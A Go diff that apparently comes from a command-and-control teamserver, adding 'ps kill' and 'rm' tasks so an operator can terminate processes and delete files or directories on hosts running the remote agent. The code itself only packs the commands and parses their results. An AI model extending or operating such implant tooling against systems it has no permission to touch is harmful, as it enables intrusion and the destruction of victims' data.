@@ -255,12 +255,33 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 		if subcommand == "list" {
 			messageInfo = "Task: show process list"
 			array = []interface{}{COMMAND_PS_LIST}
+		} else if subcommand == "kill" {
+			messageInfo = "Task: kill process"
+			pid, ok := args["pid"].(float64)
+			if !ok {
+				err = errors.New("parameter 'pid' must be set")
+				goto RET
+			}
+			array = []interface{}{COMMAND_PS_KILL, int(pid)}
+		} else {
+			err = errors.New("subcommand must be 'list' or 'kill'")
+			goto RET
 		}
 		break
 
 	case "pwd":
 		messageInfo = "Task: print working directory"
 		array = []interface{}{COMMAND_PWD}
+		break
+
+	case "rm":
+		messageInfo = "Task: remove file or directory"
+		path, ok := args["path"].(string)
+		if !ok {
+			err = errors.New("parameter 'path' must be set")
+			goto RET
+		}
+		array = []interface{}{COMMAND_RM, ConvertUTF8toCp(path, agent.ACP)}
 		break
 
 	case "sleep":
@@ -625,10 +646,24 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 
 			break
 
+		case COMMAND_PS_KILL:
+			pid := packer.ParseInt32()
+			task.Message = fmt.Sprintf("Process %d killed", pid)
+			break
+
 		case COMMAND_PWD:
 			path := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
 			task.Message = "Curren working directory:"
 			task.ClearText = path
+			break
+
+		case COMMAND_RM:
+			result := packer.ParseInt8()
+			if result == 0 {
+				task.Message = "File deleted successfully"
+			} else {
+				task.Message = "Directory deleted successfully"
+			}
 			break
 
 		case COMMAND_TERMINATE:
